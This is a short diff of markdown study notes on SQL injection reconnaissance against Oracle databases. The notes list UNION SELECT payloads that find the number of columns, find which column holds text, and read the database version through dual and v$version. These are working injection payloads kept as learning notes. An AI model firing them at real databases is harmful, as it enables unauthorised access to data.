@@ -6,8 +6,7 @@
 
 ## Examining the database
 
-- **Note**: On <mark style="background: #BBFABBA6;">Oracle</mark> databases, every `SELECT` statement must specify a table to select -> if its not from table use `dual` -> 
-> determine number of columns: `'+UNION+SELECT+'abc','def'+FROM+dual--`
+> determine number of columns/which column contains text: `'+UNION+SELECT+'abc','def'+FROM+dual--`
 > database version: `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`
 
 - On <mark style="background: #BBFABBA6;">MySQL and Microsoft</mark>
